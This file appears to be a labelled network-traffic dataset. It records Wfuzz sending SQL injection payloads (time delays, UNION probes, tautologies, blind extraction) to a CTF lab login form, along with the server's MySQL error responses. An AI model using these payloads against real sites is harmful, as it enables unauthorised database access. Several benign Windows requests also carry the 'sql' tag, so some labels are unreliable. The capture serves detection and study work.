attack_tag,dst_ip,dst_port,req_body,req_header_Accept,req_header_Connection,req_header_Content_Length,req_header_Content_Type,req_header_Host,req_header_User_Agent,req_method,req_url,res_body,res_header_Connection,res_header_Content_Length,res_header_Content_Type,res_header_Date,res_header_Response_Code,res_header_Server,src_ip,src_port
sql,192.168.1.39,80,username=waitfor delay '00:00:05'--&password=admin123&submit=submit,*/*,,67,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall2/index.php,<br /> <b>Fatal error</b>:  Uncaught PDOException: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '00:00:05'--' AND password = 'admin123'' at line 1 in /var/www/html/vuln/web/chall2/index.php:35 Stack trace: #0 /var/www/html/vuln/web/chall2/index.php(35): PDOStatement-&gt;execute() #1 /var/www/html/vuln/web/chall2/index.php(48): checkLogin() #2 {main}   thrown in <b>/var/www/html/vuln/web/chall2/index.php</b> on line <b>35</b><br /> ,,580,text/html; charset=UTF-8,"Mon, 30 Jan 2023 23:29:38 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,56475
sql,192.168.1.39,80,"username=or SLEEP(5)=""&password=admin123&submit=submit",*/*,,54,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall2/index.php,"INVALID LOGIN <!DOCTYPE html> <html> <head>  <title>csccCTF - chall2</title> </head> <body>  <form method=""POST"" action=""index.php"">   <input type=""username"" name=""username"" placeholder=""username"">   <input type=""password"" name=""password"" placeholder=""password"">   <input type=""submit"" name=""submit"" value=""submit"">  </form> </body> </html> ",,341,text/html; charset=UTF-8,"Mon, 30 Jan 2023 23:29:38 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,56476
sql,23.47.106.6,80,,*/*,Keep-Alive,,,x1.c.lencr.org,Microsoft-CryptoAPI/10.0,GET,http://x1.c.lencr.org/,,keep-alive,,application/pkix-crl,"Mon, 30 Jan 2023 23:29:49 GMT",304,,192.168.1.34,56480
sql,13.107.4.50,80,,*/*,Keep-Alive,,,ctldl.windowsupdate.com,Microsoft-CryptoAPI/10.0,GET,http://ctldl.windowsupdate.com/msdownload/update/v3/static/trustedr/en/pinrulesstl.cab?a298783fe0cb9110,,,,application/vnd.ms-cab-compressed,"Mon, 30 Jan 2023 23:29:49 GMT",304,Microsoft-IIS/10.0,192.168.1.34,56481
sql,192.168.1.39,80,"username=UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24#&password=admin123&submit=submit",*/*,,139,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall2/index.php,"<br /> <b>Fatal error</b>:  Uncaught PDOException: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24#' at line 1 in /var/www/html/vuln/web/chall2/index.php:35 Stack trace: #0 /var/www/html/vuln/web/chall2/index.php(35): PDOStatement-&gt;execute() #1 /var/www/html/vuln/web/chall2/index.php(48): checkLogin() #2 {main}   thrown in <b>/var/www/html/vuln/web/chall2/index.php</b> on line <b>35</b><br /> ",,622,text/html; charset=UTF-8,"Mon, 30 Jan 2023 23:30:00 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,56487
sql,192.168.1.39,80,"username=UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29#&password=admin123&submit=submit",*/*,,154,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall2/index.php,"<br /> <b>Fatal error</b>:  Uncaught PDOException: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,' at line 1 in /var/www/html/vuln/web/chall2/index.php:35 Stack trace: #0 /var/www/html/vuln/web/chall2/index.php(35): PDOStatement-&gt;execute() #1 /var/www/html/vuln/web/chall2/index.php(48): checkLogin() #2 {main}   thrown in <b>/var/www/html/vuln/web/chall2/index.php</b> on line <b>35</b><br /> ",,622,text/html; charset=UTF-8,"Mon, 30 Jan 2023 23:30:00 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,56490
sql,192.168.1.39,80,"username=UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7--&password=admin123&submit=submit",*/*,,91,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall2/index.php,"<br /> <b>Fatal error</b>:  Uncaught PDOException: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'INJ'||'ECT'||'XXX',2,3,4,5,6,7--' AND password = 'admin123'' at line 1 in /var/www/html/vuln/web/chall2/index.php:35 Stack trace: #0 /var/www/html/vuln/web/chall2/index.php(35): PDOStatement-&gt;execute() #1 /var/www/html/vuln/web/chall2/index.php(48): checkLogin() #2 {main}   thrown in <b>/var/www/html/vuln/web/chall2/index.php</b> on line <b>35</b><br /> ",,601,text/html; charset=UTF-8,"Mon, 30 Jan 2023 23:30:00 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,56484
sql,192.168.1.39,80,"username=UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4--&password=admin123&submit=submit",*/*,,85,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall2/index.php,"<br /> <b>Fatal error</b>:  Uncaught PDOException: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'INJ'||'ECT'||'XXX',2,3,4--' AND password = 'admin123'' at line 1 in /var/www/html/vuln/web/chall2/index.php:35 Stack trace: #0 /var/www/html/vuln/web/chall2/index.php(35): PDOStatement-&gt;execute() #1 /var/www/html/vuln/web/chall2/index.php(48): checkLogin() #2 {main}   thrown in <b>/var/www/html/vuln/web/chall2/index.php</b> on line <b>35</b><br /> ",,595,text/html; charset=UTF-8,"Mon, 30 Jan 2023 23:30:00 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,56485
sql,192.168.1.39,80,username=UNION ALL SELECT 'INJ'||'ECT'||'XXX'--&password=admin123&submit=submit,*/*,,79,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall2/index.php,<br /> <b>Fatal error</b>:  Uncaught PDOException: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'INJ'||'ECT'||'XXX'--' AND password = 'admin123'' at line 1 in /var/www/html/vuln/web/chall2/index.php:35 Stack trace: #0 /var/www/html/vuln/web/chall2/index.php(35): PDOStatement-&gt;execute() #1 /var/www/html/vuln/web/chall2/index.php(48): checkLogin() #2 {main}   thrown in <b>/var/www/html/vuln/web/chall2/index.php</b> on line <b>35</b><br /> ,,589,text/html; charset=UTF-8,"Mon, 30 Jan 2023 23:30:00 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,56486
sql,192.168.1.39,80,"username=UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26#&password=admin123&submit=submit",*/*,,145,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall2/index.php,"<br /> <b>Fatal error</b>:  Uncaught PDOException: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,' at line 1 in /var/www/html/vuln/web/chall2/index.php:35 Stack trace: #0 /var/www/html/vuln/web/chall2/index.php(35): PDOStatement-&gt;execute() #1 /var/www/html/vuln/web/chall2/index.php(48): checkLogin() #2 {main}   thrown in <b>/var/www/html/vuln/web/chall2/index.php</b> on line <b>35</b><br /> ",,622,text/html; charset=UTF-8,"Mon, 30 Jan 2023 23:30:00 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,56488
sql,192.168.1.39,80,"username=UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#&password=admin123&submit=submit",*/*,,133,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall2/index.php,"<br /> <b>Fatal error</b>:  Uncaught PDOException: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#' AND ' at line 1 in /var/www/html/vuln/web/chall2/index.php:35 Stack trace: #0 /var/www/html/vuln/web/chall2/index.php(35): PDOStatement-&gt;execute() #1 /var/www/html/vuln/web/chall2/index.php(48): checkLogin() #2 {main}   thrown in <b>/var/www/html/vuln/web/chall2/index.php</b> on line <b>35</b><br /> ",,622,text/html; charset=UTF-8,"Mon, 30 Jan 2023 23:30:00 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,56489
sql,192.168.1.39,80,"username=UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30#&password=admin123&submit=submit",*/*,,157,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall2/index.php,"<br /> <b>Fatal error</b>:  Uncaught PDOException: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,' at line 1 in /var/www/html/vuln/web/chall2/index.php:35 Stack trace: #0 /var/www/html/vuln/web/chall2/index.php(35): PDOStatement-&gt;execute() #1 /var/www/html/vuln/web/chall2/index.php(48): checkLogin() #2 {main}   thrown in <b>/var/www/html/vuln/web/chall2/index.php</b> on line <b>35</b><br /> ",,622,text/html; charset=UTF-8,"Mon, 30 Jan 2023 23:30:00 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,56491
sql,192.168.1.39,80,"username=UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27#&password=admin123&submit=submit",*/*,,148,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall2/index.php,"<br /> <b>Fatal error</b>:  Uncaught PDOException: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,' at line 1 in /var/www/html/vuln/web/chall2/index.php:35 Stack trace: #0 /var/www/html/vuln/web/chall2/index.php(35): PDOStatement-&gt;execute() #1 /var/www/html/vuln/web/chall2/index.php(48): checkLogin() #2 {main}   thrown in <b>/var/www/html/vuln/web/chall2/index.php</b> on line <b>35</b><br /> ",,622,text/html; charset=UTF-8,"Mon, 30 Jan 2023 23:30:00 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,56492
sql,192.168.1.39,80,"username=UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8--&password=admin123&submit=submit",*/*,,93,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall2/index.php,"<br /> <b>Fatal error</b>:  Uncaught PDOException: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8--' AND password = 'admin123'' at line 1 in /var/www/html/vuln/web/chall2/index.php:35 Stack trace: #0 /var/www/html/vuln/web/chall2/index.php(35): PDOStatement-&gt;execute() #1 /var/www/html/vuln/web/chall2/index.php(48): checkLogin() #2 {main}   thrown in <b>/var/www/html/vuln/web/chall2/index.php</b> on line <b>35</b><br /> ",,603,text/html; charset=UTF-8,"Mon, 30 Jan 2023 23:30:00 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,56493
sql,79.140.95.216,80,,,close,,,www.msftncsi.com,Go-http-client/1.1,GET,http://www.msftncsi.com/ncsi.txt,Microsoft NCSI,close,14,text/plain,"Mon, 30 Jan 2023 23:30:14 GMT",200,,192.168.1.34,56497
sql,192.168.1.39,80,username=1' or '1'='1&password=admin123&submit=submit,*/*,,53,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall2/index.php,"INVALID LOGIN <!DOCTYPE html> <html> <head>  <title>csccCTF - chall2</title> </head> <body>  <form method=""POST"" action=""index.php"">   <input type=""username"" name=""username"" placeholder=""username"">   <input type=""password"" name=""password"" placeholder=""password"">   <input type=""submit"" name=""submit"" value=""submit"">  </form> </body> </html> ",,341,text/html; charset=UTF-8,"Mon, 30 Jan 2023 23:30:27 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,56505
sql,192.168.1.39,80,username=1' and 1=(select count(*) from tablenames); --&password=admin123&submit=submit,*/*,,87,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall2/index.php,<br /> <b>Fatal error</b>:  Uncaught PDOException: SQLSTATE[42S02]: Base table or view not found: 1146 Table 'cscc_sqli1.tablenames' doesn't exist in /var/www/html/vuln/web/chall2/index.php:35 Stack trace: #0 /var/www/html/vuln/web/chall2/index.php(35): PDOStatement-&gt;execute() #1 /var/www/html/vuln/web/chall2/index.php(48): checkLogin() #2 {main}   thrown in <b>/var/www/html/vuln/web/chall2/index.php</b> on line <b>35</b><br /> ,,435,text/html; charset=UTF-8,"Mon, 30 Jan 2023 23:30:27 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,56509
sql,192.168.1.39,80,username=1'1&password=admin123&submit=submit,*/*,,44,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall2/index.php,<br /> <b>Fatal error</b>:  Uncaught PDOException: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '1' AND password = 'admin123'' at line 1 in /var/www/html/vuln/web/chall2/index.php:35 Stack trace: #0 /var/www/html/vuln/web/chall2/index.php(35): PDOStatement-&gt;execute() #1 /var/www/html/vuln/web/chall2/index.php(48): checkLogin() #2 {main}   thrown in <b>/var/www/html/vuln/web/chall2/index.php</b> on line <b>35</b><br /> ,,570,text/html; charset=UTF-8,"Mon, 30 Jan 2023 23:30:27 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,56502
sql,192.168.1.39,80,username=1 and 1=1&password=admin123&submit=submit,*/*,,50,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall2/index.php,"INVALID LOGIN <!DOCTYPE html> <html> <head>  <title>csccCTF - chall2</title> </head> <body>  <form method=""POST"" action=""index.php"">   <input type=""username"" name=""username"" placeholder=""username"">   <input type=""password"" name=""password"" placeholder=""password"">   <input type=""submit"" name=""submit"" value=""submit"">  </form> </body> </html> ",,341,text/html; charset=UTF-8,"Mon, 30 Jan 2023 23:30:27 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,56503
sql,192.168.1.39,80,username=1or1=1&password=admin123&submit=submit,*/*,,47,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall2/index.php,"INVALID LOGIN <!DOCTYPE html> <html> <head>  <title>csccCTF - chall2</title> </head> <body>  <form method=""POST"" action=""index.php"">   <input type=""username"" name=""username"" placeholder=""username"">   <input type=""password"" name=""password"" placeholder=""password"">   <input type=""submit"" name=""submit"" value=""submit"">  </form> </body> </html> ",,341,text/html; charset=UTF-8,"Mon, 30 Jan 2023 23:30:27 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,56504
sql,192.168.1.39,80,username=fake@ema'or'il.nl'='il.nl&password=admin123&submit=submit,*/*,,66,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall2/index.php,"INVALID LOGIN <!DOCTYPE html> <html> <head>  <title>csccCTF - chall2</title> </head> <body>  <form method=""POST"" action=""index.php"">   <input type=""username"" name=""username"" placeholder=""username"">   <input type=""password"" name=""password"" placeholder=""password"">   <input type=""submit"" name=""submit"" value=""submit"">  </form> </body> </html> ",,341,text/html; charset=UTF-8,"Mon, 30 Jan 2023 23:30:27 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,56506
sql,192.168.1.39,80,username=1'or'1'='1&password=admin123&submit=submit,*/*,,51,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall2/index.php,"INVALID LOGIN <!DOCTYPE html> <html> <head>  <title>csccCTF - chall2</title> </head> <body>  <form method=""POST"" action=""index.php"">   <input type=""username"" name=""username"" placeholder=""username"">   <input type=""password"" name=""password"" placeholder=""password"">   <input type=""submit"" name=""submit"" value=""submit"">  </form> </body> </html> ",,341,text/html; charset=UTF-8,"Mon, 30 Jan 2023 23:30:27 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,56507
sql,192.168.1.39,80,username=1 exec sp_ (or exec xp_)&password=admin123&submit=submit,*/*,,65,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall2/index.php,"INVALID LOGIN <!DOCTYPE html> <html> <head>  <title>csccCTF - chall2</title> </head> <body>  <form method=""POST"" action=""index.php"">   <input type=""username"" name=""username"" placeholder=""username"">   <input type=""password"" name=""password"" placeholder=""password"">   <input type=""submit"" name=""submit"" value=""submit"">  </form> </body> </html> ",,341,text/html; charset=UTF-8,"Mon, 30 Jan 2023 23:30:27 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,56508
sql,192.168.1.39,80,username=1 or 1=1&password=admin123&submit=submit,*/*,,49,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall2/index.php,"INVALID LOGIN <!DOCTYPE html> <html> <head>  <title>csccCTF - chall2</title> </head> <body>  <form method=""POST"" action=""index.php"">   <input type=""username"" name=""username"" placeholder=""username"">   <input type=""password"" name=""password"" placeholder=""password"">   <input type=""submit"" name=""submit"" value=""submit"">  </form> </body> </html> ",,341,text/html; charset=UTF-8,"Mon, 30 Jan 2023 23:30:27 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,56510
sql,192.168.1.39,80,username=1&password=admin123&submit=submit,*/*,,42,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall2/index.php,"INVALID LOGIN <!DOCTYPE html> <html> <head>  <title>csccCTF - chall2</title> </head> <body>  <form method=""POST"" action=""index.php"">   <input type=""username"" name=""username"" placeholder=""username"">   <input type=""password"" name=""password"" placeholder=""password"">   <input type=""submit"" name=""submit"" value=""submit"">  </form> </body> </html> ",,341,text/html; charset=UTF-8,"Mon, 30 Jan 2023 23:30:33 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,56512
sql,192.168.1.39,80,username=1 and user_name() = 'dbo'&password=admin123&submit=submit,*/*,,66,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall2/index.php,<br /> <b>Fatal error</b>:  Uncaught PDOException: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'dbo'' AND password = 'admin123'' at line 1 in /var/www/html/vuln/web/chall2/index.php:35 Stack trace: #0 /var/www/html/vuln/web/chall2/index.php(35): PDOStatement-&gt;execute() #1 /var/www/html/vuln/web/chall2/index.php(48): checkLogin() #2 {main}   thrown in <b>/var/www/html/vuln/web/chall2/index.php</b> on line <b>35</b><br /> ,,573,text/html; charset=UTF-8,"Mon, 30 Jan 2023 23:30:33 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,56519
sql,192.168.1.39,80,username=1\'1&password=admin123&submit=submit,*/*,,45,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall2/index.php,"INVALID LOGIN <!DOCTYPE html> <html> <head>  <title>csccCTF - chall2</title> </head> <body>  <form method=""POST"" action=""index.php"">   <input type=""username"" name=""username"" placeholder=""username"">   <input type=""password"" name=""password"" placeholder=""password"">   <input type=""submit"" name=""submit"" value=""submit"">  </form> </body> </html> ",,341,text/html; charset=UTF-8,"Mon, 30 Jan 2023 23:30:33 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,56520
sql,192.168.1.39,80,username=1' and non_existant_table = '1&password=admin123&submit=submit,*/*,,71,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall2/index.php,<br /> <b>Fatal error</b>:  Uncaught PDOException: SQLSTATE[42S22]: Column not found: 1054 Unknown column 'non_existant_table' in 'where clause' in /var/www/html/vuln/web/chall2/index.php:35 Stack trace: #0 /var/www/html/vuln/web/chall2/index.php(35): PDOStatement-&gt;execute() #1 /var/www/html/vuln/web/chall2/index.php(48): checkLogin() #2 {main}   thrown in <b>/var/www/html/vuln/web/chall2/index.php</b> on line <b>35</b><br /> ,,433,text/html; charset=UTF-8,"Mon, 30 Jan 2023 23:30:33 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,56521
sql,192.168.1.39,80,username=\'; desc users; --&password=admin123&submit=submit,*/*,,59,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall2/index.php,"INVALID LOGIN <!DOCTYPE html> <html> <head>  <title>csccCTF - chall2</title> </head> <body>  <form method=""POST"" action=""index.php"">   <input type=""username"" name=""username"" placeholder=""username"">   <input type=""password"" name=""password"" placeholder=""password"">   <input type=""submit"" name=""submit"" value=""submit"">  </form> </body> </html> ",,341,text/html; charset=UTF-8,"Mon, 30 Jan 2023 23:30:33 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,56513
sql,192.168.1.39,80,"username=1 and ascii(lower(substring((select top 1 name from sysobjects where xtype='u'), 1, 1))) > 116&password=admin123&submit=submit",*/*,,135,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall2/index.php,"<br /> <b>Fatal error</b>:  Uncaught PDOException: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'u'), 1, 1))) &gt; 116' AND password = 'admin123'' at line 1 in /var/www/html/vuln/web/chall2/index.php:35 Stack trace: #0 /var/www/html/vuln/web/chall2/index.php(35): PDOStatement-&gt;execute() #1 /var/www/html/vuln/web/chall2/index.php(48): checkLogin() #2 {main}   thrown in <b>/var/www/html/vuln/web/chall2/index.php</b> on line <b>35</b><br /> ",,590,text/html; charset=UTF-8,"Mon, 30 Jan 2023 23:30:33 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,56514
sql,192.168.1.39,80,username=' or username is not NULL or username = '&password=admin123&submit=submit,*/*,,82,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall2/index.php,<br /> <b>Fatal error</b>:  Uncaught PDOException: SQLSTATE[42S22]: Column not found: 1054 Unknown column 'flag' in 'field list' in /var/www/html/vuln/web/chall2/index.php:23 Stack trace: #0 /var/www/html/vuln/web/chall2/index.php(23): PDOStatement-&gt;execute() #1 /var/www/html/vuln/web/chall2/index.php(49): getFlag() #2 {main}   thrown in <b>/var/www/html/vuln/web/chall2/index.php</b> on line <b>23</b><br /> ,,414,text/html; charset=UTF-8,"Mon, 30 Jan 2023 23:30:33 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,56515
sql,192.168.1.39,80,username=&password=admin123&submit=submit,*/*,,41,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall2/index.php,"username or password empty <!DOCTYPE html> <html> <head>  <title>csccCTF - chall2</title> </head> <body>  <form method=""POST"" action=""index.php"">   <input type=""username"" name=""username"" placeholder=""username"">   <input type=""password"" name=""password"" placeholder=""password"">   <input type=""submit"" name=""submit"" value=""submit"">  </form> </body> </html> ",,354,text/html; charset=UTF-8,"Mon, 30 Jan 2023 23:30:33 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,56516
sql,192.168.1.39,80,username=1 uni/**/on select all from where&password=admin123&submit=submit,*/*,,74,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall2/index.php,"INVALID LOGIN <!DOCTYPE html> <html> <head>  <title>csccCTF - chall2</title> </head> <body>  <form method=""POST"" action=""index.php"">   <input type=""username"" name=""username"" placeholder=""username"">   <input type=""password"" name=""password"" placeholder=""password"">   <input type=""submit"" name=""submit"" value=""submit"">  </form> </body> </html> ",,341,text/html; charset=UTF-8,"Mon, 30 Jan 2023 23:30:33 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,56517
sql,192.168.1.39,80,"username=1 union all select 1,2,3,4,5,6,name from sysobjects where xtype = 'u' --&password=admin123&submit=submit",*/*,,113,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall2/index.php,<br /> <b>Fatal error</b>:  Uncaught PDOException: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'u' --' AND password = 'admin123'' at line 1 in /var/www/html/vuln/web/chall2/index.php:35 Stack trace: #0 /var/www/html/vuln/web/chall2/index.php(35): PDOStatement-&gt;execute() #1 /var/www/html/vuln/web/chall2/index.php(48): checkLogin() #2 {main}   thrown in <b>/var/www/html/vuln/web/chall2/index.php</b> on line <b>35</b><br /> ,,574,text/html; charset=UTF-8,"Mon, 30 Jan 2023 23:30:33 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,56518
